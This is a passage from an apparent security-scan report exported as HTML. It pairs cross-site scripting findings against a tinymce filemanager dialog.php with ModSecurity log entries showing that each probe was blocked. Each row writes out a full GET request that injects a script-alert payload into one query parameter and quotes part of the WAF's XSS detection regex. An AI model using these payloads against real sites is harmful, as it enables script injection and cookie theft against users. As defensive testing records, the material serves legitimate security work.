 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_0&amp;akey=key&amp;fldr=&amp;551ac1cc4bcfb</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >relative_0</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_0=&quot;&gt;&lt;script&gt;alert(503899)&lt;/script&gt;&lt;!--&amp;akey=key&amp;fldr=TestName&amp;551ac1cc4bcfb=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=TestName%2F; PHPSESSID=bg9iojs11gjoe3pc5uqbqn5dv7
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:27:34</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:27:33 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:relative_0. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(503899)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRtsrawQAW0AAHhGMtkAAAAK&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRtsrawQAW0AAHhGMtkAAAAK</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366802</td><td class=xl24 width=64 >2015-03-31 19:48:13</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_0&amp;akey=key&amp;fldr=test/&amp;551ac1cc89409</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >crossdomain</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=&quot;&gt;&lt;script&gt;alert(878099)&lt;/script&gt;&lt;!--&amp;field_id=100&amp;relative_0=TestName&amp;akey=key&amp;fldr=test/&amp;551ac1cc89409=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=test%2F; PHPSESSID=965q163iv69iq12ujj4vucvhs1
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:27:35</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:27:34 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:crossdomain. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(878099)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRtsrqwQAW0AAHzDqr8AAAAH&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRtsrqwQAW0AAHzDqr8AAAAH</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366803</td><td class=xl24 width=64 >2015-03-31 19:48:49</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_0&amp;akey=key&amp;fldr=test/&amp;551ac1cc893bd</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >field_id</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&quot;&gt;&lt;script&gt;alert(237799)&lt;/script&gt;&lt;!--&amp;relative_0=TestName&amp;akey=key&amp;fldr=test/&amp;551ac1cc893bd=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=test%2F; PHPSESSID=h7he7tj10iqosplh9hu9pigtc0
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:27:37</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:27:35 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:field_id. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(237799)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRtsr6wQAW0AAHewA88AAAAN&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRtsr6wQAW0AAHewA88AAAAN</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366804</td><td class=xl24 width=64 >2015-03-31 19:49:58</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_0&amp;akey=key&amp;fldr=&amp;551ac1cc4bcfb</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >akey</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_0=TestName&amp;akey=&quot;&gt;&lt;script&gt;alert(496799)&lt;/script&gt;&lt;!--&amp;fldr=TestName&amp;551ac1cc4bcfb=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=TestName%2F; PHPSESSID=1ifqqiogau05cqja09f0jj2lk0
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:27:38</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:27:37 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:akey. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(496799)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRtssawQAW0AAD9hYNsAAAAC&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRtssawQAW0AAD9hYNsAAAAC</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366805</td><td class=xl24 width=64 >2015-03-31 19:51:43</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_0&amp;akey=key&amp;fldr=test/&amp;551ac1cc89409</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >field_id</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&quot;&gt;&lt;script&gt;alert(335199)&lt;/script&gt;&lt;!--&amp;relative_0=TestName&amp;akey=key&amp;fldr=test/&amp;551ac1cc89409=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=test%2F; PHPSESSID=ngrjj2ib1ue5g5eeqr2vb389j1
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:27:39</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:27:38 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:field_id. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(335199)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRtssqwQAW0AABvT@GsAAAAL&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRtssqwQAW0AABvT@GsAAAAL</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366806</td><td class=xl24 width=64 >2015-03-31 19:52:25</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_0&amp;akey=key&amp;fldr=test/&amp;551ac1cc893bd</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >relative_0</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_0=&quot;&gt;&lt;script&gt;alert(231199)&lt;/script&gt;&lt;!--&amp;akey=key&amp;fldr=test/&amp;551ac1cc893bd=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=test%2F; PHPSESSID=eahkvoeh6gihdemjms8q4mvql5
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:27:40</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:27:39 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:relative_0. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(231199)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRtss6wQAW0AAHhB77MAAAAD&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRtss6wQAW0AAHhB77MAAAAD</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366807</td><td class=xl24 width=64 >2015-03-31 19:53:28</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_0&amp;akey=key&amp;fldr=&amp;551ac1cc4bcfb</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >fldr</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_0=TestName&amp;akey=key&amp;fldr=&quot;&gt;&lt;script&gt;alert(278399)&lt;/script&gt;&lt;!--&amp;551ac1cc4bcfb=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=%22%3Ealert%28278399%29%2F; PHPSESSID=820h78i44i6s9e35802aqna0e4
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:27:42</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:27:40 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:fldr. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(278399)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRtstKwQAW0AABt@bVoAAAAB&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRtstKwQAW0AABt@bVoAAAAB</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366808</td><td class=xl24 width=64 >2015-03-31 19:55:13</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


